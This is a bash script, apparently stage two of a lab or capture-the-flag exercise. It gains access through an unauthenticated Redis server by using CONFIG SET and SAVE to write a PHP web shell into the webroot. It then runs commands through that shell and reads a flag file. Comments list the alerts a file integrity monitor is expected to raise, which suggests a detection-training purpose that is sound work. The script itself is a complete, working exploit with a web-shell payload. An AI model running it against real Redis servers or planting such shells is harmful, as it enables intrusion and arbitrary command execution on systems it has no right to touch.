#!/usr/bin/env bash
# Stage 2 — initial access through exposed redis: no auth, protected-mode
# off, running as www-data with a writable webroot. The classic CONFIG SET
# + SAVE web shell drop. The exploit is network-only and nearly silent —
# elmer's file integrity monitor is what catches the shell landing.
#
# No redis-cli needed on the attacker box: the script speaks RESP over nc.
set -euo pipefail
. "$(dirname "$0")/lib.sh"

need nc "netcat (nc)"

check_target

say "redis at $TARGET:6379 — no auth"
reply=$(redis_cmd PING)
[[ $reply == *PONG* ]] || die "redis did not answer PONG (up? bound to 0.0.0.0?)"

say "dropping a web shell via CONFIG SET + SAVE"
redis_cmd FLUSHALL >/dev/null
redis_cmd SET payload '<?php system($_GET["c"]); ?>' >/dev/null
# Assert each step loudly: redis 7 refuses these with "can't set
# protected config" unless enable-protected-configs yes is set on the
# server, and a swallowed failure means SAVE just rewrites dump.rdb
# in /var/lib/redis and returns OK anyway.
reply=$(redis_cmd CONFIG SET dir /var/www/html)
[[ $reply == *OK* ]] || die "CONFIG SET dir rejected: $reply"
reply=$(redis_cmd CONFIG SET dbfilename shell.php)
[[ $reply == *OK* ]] || die "CONFIG SET dbfilename rejected: $reply"
reply=$(redis_cmd SAVE)
[[ $reply == *OK* ]] || die "redis could not write the web shell (webroot perms?): $reply"
code=$(curl -s -o /dev/null -w '%{http_code}' -m 10 -G "http://$TARGET/shell.php" --data-urlencode 'c=id')
[[ $code == 200 ]] || die "web shell not reachable (HTTP $code)"

say "using the shell — responses start with redis RDB junk, that's normal"
webshell 'id'
webshell 'cat /var/www/flag.txt'

note "expected on the target:"
note "  file    FIM event — new file under /var/www/ (the extra watch)"
note "  process INFO     every command the shell runs"
note "  process CRITICAL flag-access — /var/www/flag.txt"
note "  network nothing  the exploit is inbound-only; FIM does the work"
